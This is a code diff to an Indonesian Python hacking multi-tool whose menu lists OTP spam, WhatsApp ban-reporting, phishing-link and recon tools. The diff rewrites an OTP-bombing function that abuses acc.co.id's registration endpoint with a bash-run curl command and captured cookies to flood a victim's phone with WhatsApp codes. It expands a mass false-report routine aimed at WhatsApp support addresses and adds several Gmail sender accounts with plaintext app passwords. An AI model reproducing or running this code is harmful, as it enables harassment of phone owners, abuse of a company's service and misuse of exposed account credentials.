@@ -469,9 +469,9 @@ def print_banner(user, date, username):
 {W}│  {W}UID   : {C}{uid}{N}
 {W}│  {W}Status: {status_text}{N}
 {W}│  {W}Author: {G}Rulzzz_06{N}
-{W}│  {W}Tools : {G}27{N}
+{W}│  {W}Tools : {G}28{N}
 {W}│  {W}Date  : {G}{date}{N}
-{W}│  {W}Version: {G}2.3.1{N}
+{W}│  {W}Version: {G}2.3.3{N}
 {W}│  {W}UserName: {G}{username}{N}
 {W}│  {W}User : {G}Premium{N}
 {W}╰─────────────────────────────────────────────────────────────╯{N}
@@ -504,6 +504,7 @@ def print_banner(user, date, username):
 {W}│ [ {G}25{N} ] Cek IMEI{N}
 {W}│ [ {G}26{N} ] Cek Link {R}/{N} Web Phising{N}
 {W}│ [ {G}27{N} ] Web Reconnaissance{N}
+{W}│ [ {G}28{N} ] lapor Bug ke Admin{N}
 {W}╰╭────────────────────────────────────────────────────────────╮{N}
 {W}  {R}00{N} EXIT{N}
 {W}╰────────────────────────────────────────────────────────────╯{N}
@@ -788,121 +789,59 @@ def spam_otp_duniagames(nomor):
 def spam_otp_acc(nomor):
     try:
         if nomor.startswith('0'):
-            nomor = nomor
+            phone = nomor
         elif nomor.startswith('62'):
-            nomor = '0' + nomor[2:]
+            phone = '0' + nomor[2:]
         elif nomor.startswith('+62'):
-            nomor = '0' + nomor[3:]
+            phone = '0' + nomor[3:]
         else:
-            nomor = '0' + nomor
+            phone = '0' + nomor
         
-        nomor = ''.join(filter(str.isdigit, nomor))
+        phone = ''.join(filter(str.isdigit, phone))
         
-        if len(nomor) < 10:
-            return False
+        if not phone.startswith('0'):
+            phone = '0' + phone
         
-        session = requests.Session()
+        import subprocess
+        import json
         
-        cookies = {
-            'deviceId': 'Mozilla%2F5.0%20(Linux%3B%20Android%2010%3B%20K)%20AppleWebKit%2F537.36%20(KHTML%2C%20like%20Gecko)%20Chrome%2F149.0.0.0%20Mobile%20Safari%2F537.36',
-            '_gcl_gs': '2.1.k1$i1783212550$u132089247',
-            '_gcl_aw': 'GCL.1783212563.Cj0KCQjw3qLSBhDaARIsAFTiVh61CRKOfc78DkMYKO17cJqYH3QufK-mr9kpJU1bBxYt1tD6nnokC0oaAuAWEALw_wcB',
-            '_ga_HSTJBSDEEW': 'GS2.1.s1783212562$o1$g0$t1783212562$j60$l0$h0',
-            '_ga': 'GA1.1.2146116177.1783212563',
-            '_fbp': 'fb.2.1783212567536.574928455222574690',
-            '_uetsid': '5d560b00780b11f1aef395103683bb8f',
-            '_uetvid': '5d56eab0780b11f1b98421a5d543c1a8',
-            '_gcl_au': '1.1.612971413.1783212562.894107281.1783212583.1783212631'
-        }
+        next_action = "7f8e862fff4b3a97ae5e866780a086283a999e8a7f"
+        next_router = "%5B%22%22%2C%7B%22children%22%3A%5B%22(auth)%22%2C%7B%22children%22%3A%5B%22register%22%2C%7B%22children%22%3A%5B%22new-account%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%2Ctrue%5D"
         
-        session.cookies.update(cookies)
+        curl_cmd = f"""curl -s -X POST 'https://www.acc.co.id/register/new-account' \\
+  -H 'Host: www.acc.co.id' \\
+  -H 'sec-ch-ua-platform: "Android"' \\
+  -H 'next-action: {next_action}' \\
+  -H 'sec-ch-ua: "Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"' \\
+  -H 'sec-ch-ua-mobile: ?1' \\
+  -H 'next-router-state-tree: {next_router}' \\
+  -H 'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36' \\
+  -H 'Accept: text/x-component' \\
+  -H 'Content-Type: text/plain;charset=UTF-8' \\
+  -H 'Origin: https://www.acc.co.id' \\
+  -H 'Sec-Fetch-Site: same-origin' \\
+  -H 'Sec-Fetch-Mode: cors' \\
+  -H 'Sec-Fetch-Dest: empty' \\
+  -H 'Referer: https://www.acc.co.id/register/new-account' \\
+  -H 'Accept-Encoding: gzip, deflate, br, zstd' \\
+  -H 'Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
+  -H 'Cookie: _gcl_gs=2.1.k1$i1783212550$u132089247; _gcl_aw=GCL.1783212563.Cj0KCQjw3qLSBhDaARIsAFTiVh61CRKOfc78DkMYKO17cJqYH3QufK-mr9kpJU1bBxYt1tD6nnokC0oaAuAWEALw_wcB; _ga=GA1.1.2146116177.1783212563; _fbp=fb.2.1783212567536.574928455222574690; acw_tc=0a0a131517868956750878858e541f01b7d928d2a585326a758c753a2cc50e; deviceId=Mozilla%2F5.0%20(Linux%3B%20Android%2010%3B%20K)%20AppleWebKit%2F537.36%20(KHTML%2C%20like%20Gecko)%20Chrome%2F151.0.0.0%20Mobile%20Safari%2F537.36; _ga_HSTJBSDEEW=GS2.1.s1786895689$o3$g0$t1786895689$j60$l0$h0; _uetsid=d03ca050998a11f18069e52179483202; _uetvid=5d56eab0780b11f1b98421a5d543c1a8; mp_e88342495971d35d9d9164ffba696eec_mixpanel=%7B%22distinct_id%22%3A%22%24device%3Acf86d193-c59e-4187-be14-77874755733f%22%2C%22%24device_id%22%3A%22cf86d193-c59e-4187-be14-77874755733f%22%2C%22%24search_engine%22%3A%22google%22%2C%22utm_source%22%3A%22LAL%20Prospek%20IN%20Valid%20MGU%20Mar-Apr%22%2C%22utm_medium%22%3A%22Pmax%201%22%2C%22%24initial_referrer%22%3A%22https%3A%2F%2Fwww.google.com%2F%22%2C%22%24initial_referring_domain%22%3A%22www.google.com%22%2C%22__mps%22%3A%7B%7D%2C%22__mpso%22%3A%7B%22initial_utm_source%22%3A%22LAL%20Prospek%20IN%20Valid%20MGU%20Mar-Apr%22%2C%22initial_utm_medium%22%3A%22Pmax%201%22%2C%22initial_utm_campaign%22%3Anull%2C%22initial_utm_content%22%3Anull%2C%22initial_utm_term%22%3Anull%2C%22initial_utm_id%22%3Anull%2C%22initial_utm_source_platform%22%3Anull%2C%22initial_utm_campaign_id%22%3Anull%2C%22initial_utm_creative_format%22%3Anull%2C%22initial_utm_marketing_tactic%22%3Anull%2C%22%24initial_referrer%22%3A%22https%3A%2F%2Fwww.google.com%2F%22%2C%22%24initial_referring_domain%22%3A%22www.google.com%22%7D%2C%22__mpus%22%3A%7B%7D%2C%22__mpa%22%3A%7B%7D%2C%22__mpu%22%3A%7B%7D%2C%22__mpr%22%3A%5B%5D%2C%22__mpap%22%3A%5B%5D%7D; _gcl_au=1.1.612971413.1783212562.2099357529.1786895693.1786895726.1390151220.1786895693.1786895726' \\
+  --data-raw '[{{"user_id":null,"action":"register","send_to":"{phone}","provider":"whatsapp"}}]'"""
         
-        names = ['user', 'test', 'demo', 'account', 'customer', 'client', 'member']
-        domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'protonmail.com']
-        email = f"{random.choice(names)}{random.randint(100, 9999)}@{random.choice(domains)}"
+        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
         
-        headers_base = {
-            'Accept': 'text/x-component',
-            'Accept-Encoding': 'gzip, deflate, br, zstd',
-            'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
-            'Content-Type': 'text/plain;charset=UTF-8',
-            'Origin': 'https://www.acc.co.id',
-            'Referer': 'https://www.acc.co.id/register/new-account',
-            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Mobile Safari/537.36',
-            'sec-ch-ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-            'Sec-Fetch-Dest': 'empty',
-            'Sec-Fetch-Mode': 'cors',
-            'Sec-Fetch-Site': 'same-origin'
-        }
-        
-        headers_step1 = headers_base.copy()
-        headers_step1['next-action'] = '7fc5be84ee185b80f736b9361a94bb5b7008609886'
-        headers_step1['next-router-state-tree'] = '%5B%22%22%2C%7B%22children%22%3A%5B%22(auth)%22%2C%7B%22children%22%3A%5B%22register%22%2C%7B%22children%22%3A%5B%22new-account%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%2Ctrue%5D%7D%2Cnull%2Cnull%2Ctrue%5D'
-        
-        payload_step1 = [{"email": email}]
-        
-        r1 = session.post('https://www.acc.co.id/register/new-account',
-            headers=headers_step1,
-            json=payload_step1,
-            timeout=10
-        )
-        
-        if r1.status_code != 200:
-            return False
-        
-        headers_step2 = headers_base.copy()
-        headers_step2['next-action'] = '7fc5be84ee185b80f736b9361a94bb5b7008609886'
-        headers_step2['next-router-state-tree'] = '%5B%22%22%2C%7B%22children%22%3A%5B%22(auth)%22%2C%7B%22children%22%3A%5B%22register%22%2C%7B%22children%22%3A%5B%22new-account%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%2Ctrue%5D%7D%2Cnull%2Cnull%2Ctrue%5D'
-        
-        payload_step2 = [{"phone": nomor}]
-        
-        r2 = session.post('https://www.acc.co.id/register/new-account',
-            headers=headers_step2,
-            json=payload_step2,
-            timeout=10
-        )
-        
-        if r2.status_code != 200:
-            return False
-        
-        headers_step3 = headers_base.copy()
-        headers_step3['next-action'] = '7fb263ed0e316a392a6bcaa10f6b95ac32c1c1933b'
-        headers_step3['next-router-state-tree'] = '%5B%22%22%2C%7B%22children%22%3A%5B%22(auth)%22%2C%7B%22children%22%3A%5B%22register%22%2C%7B%22children%22%3A%5B%22new-account%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%2Ctrue%5D%7D%2Cnull%2Cnull%2Ctrue%5D'
-        
-        payload_step3 = [
-            {
-                "user_id": None,
-                "action": "register",
-                "send_to": nomor,
-                "provider": "whatsapp"
-            }
-        ]
-        
-        r3 = session.post('https://www.acc.co.id/register/new-account',
-            headers=headers_step3,
-            json=payload_step3,
-            timeout=10
-        )
-        
-        if r3.status_code == 200:
+        if result.returncode == 0 and result.stdout:
             try:
-                data = r3.json()
+                data = json.loads(result.stdout)
                 if data and len(data) > 0:
-                    result = data[0]
-                    if result.get('success'):
+                    if data[0].get('success'):
                         return True
-                    elif result.get('error'):
-                        return False
-                    else:
+                    if data[0].get('message') and 'otp' in str(data[0].get('message')).lower():
                         return True
-                else:
-                    return True
+                return False
             except:
-                return True if r3.status_code == 200 else False
-        else:
-            return False
+                return True
+        return False
         
     except Exception as e:
         return False
@@ -6250,8 +6189,8 @@ def tool_spam_report():
 """
         os.system(f'echo "{ascii_wa}" | lolcat')
         print(f"{W}╭─────────────────────────────────────────────────────────────────╮{N}")
-        print(f"{W}│  Author {R}: {h}Rulzz06                                      {N}")
-        print(f"{W}│  Tools  {R}: {h}SPAM REPORT WHATSAPP                         {N}")
+        print(f"{W}│  Author {R}: {h}Rulzzz_06                                      {N}")
+        print(f"{W}│  Tools  {R}: {h}Spam report Wa {R}/{h} Band Wa               {N}")
         print(f"{W}╰─────────────────────────────────────────────────────────────────╯{N}")
 
     def loadbar_ban(stop_event):
@@ -6266,7 +6205,7 @@ def tool_spam_report():
                     break
                 filled = COLORS[color_index % len(COLORS)] + '■' * i + RESET
                 empty = '□' * (length - i)
-                sys.stdout.write(f'\r {p} Sedang MemProses Spam Report, Mohon Tunggu Sebentar │ [[{filled}{empty}{p}]]')
+                sys.stdout.write(f'\r {p} Sedang MemProses Spam Report │ [[{filled}{empty}{p}]]')
                 sys.stdout.flush()
                 time.sleep(0.05)
                 color_index += 1
@@ -6276,6 +6215,14 @@ def tool_spam_report():
 
     EMAIL_TARGETS = [
         'abuse@whatsapp.com',
+        'support@support.whatsapp.com',
+        'business@support.whatsapp.com',
+        'report@support.whatsapp.com',
+        'account@support.whatsapp.com',
+        'accounts@support.whatsapp.com',
+        'legal@support.whatsapp.com',
+        'security@support.whatsapp.com',
+        'bugreport@support.whatsapp.com',
         'support@whatsapp.com',
         'smb@support.whatsapp.com',
         'business@support.whatsapp.com',
@@ -6293,6 +6240,7 @@ def tool_spam_report():
     def get_email_senders():
         return [
             {'email': 'termuxmikasa@gmail.com', 'app_password': 'jrpi ejvt rfte kuxd'},
+            {'email': 'adrianardhiaksa86@gmail.com', 'app_password': 'vrhb arhq omjz pgus'},
             {'email': 'tt0861230@gmail.com', 'app_password': 'gtdy mllp rvft fdzt'},
             {'email': 'spamreportuntukproyek@gmail.com', 'app_password': 'rcjb wtpf cpmb zqmc'},
             {'email': 'ya2771326@gmail.com', 'app_password': 'bpex yhmi ymmm mzrt'},
@@ -6323,6 +6271,9 @@ def tool_spam_report():
             {'email': 'v8728799@gmail.com', 'app_password': 'wjng geyu qrjb qrkz'},
             {'email': 'malzoffcial5009@gmail.com', 'app_password': 'iebj mqgx xjuk wfs'},
             {'email': 'sonin.spd01@gmail.com', 'app_password': 'fkpp cyay qfdb syll'},
+            {'email': 'shoope1456@gmail.com', 'app_password': 'ihwu mtuk ilpf hjng'},
+            {'email': 'shoopee1456@gmail.com', 'app_password': 'bvee tsie vfgm spkk'},
+            {'email': 'justzero194@gmail.com', 'app_password': 'nadf fgan fbew uyhc'},
         ]
 
     def buat_subject(nomor):
@@ -12667,6 +12618,11 @@ def tool_web_recon():
 
     input(f"\n{U}❯❯❯ {W}Tekan {R}Enter{W} Untuk Kembali...{N}")
 
+def lapor_bug():
+    os.system('xdg-open \'https://wa.me/+6283832110509\'')
+    time.sleep(3)
+    return
+
 def menu_utama():
     global clock_running, current_input
     
@@ -12702,6 +12658,7 @@ def menu_utama():
         "25": tool_imei_checker,
         "26": tool_web_phising,
         "27": tool_web_recon,
+        "28": lapor_bug,
     }
     
     try:
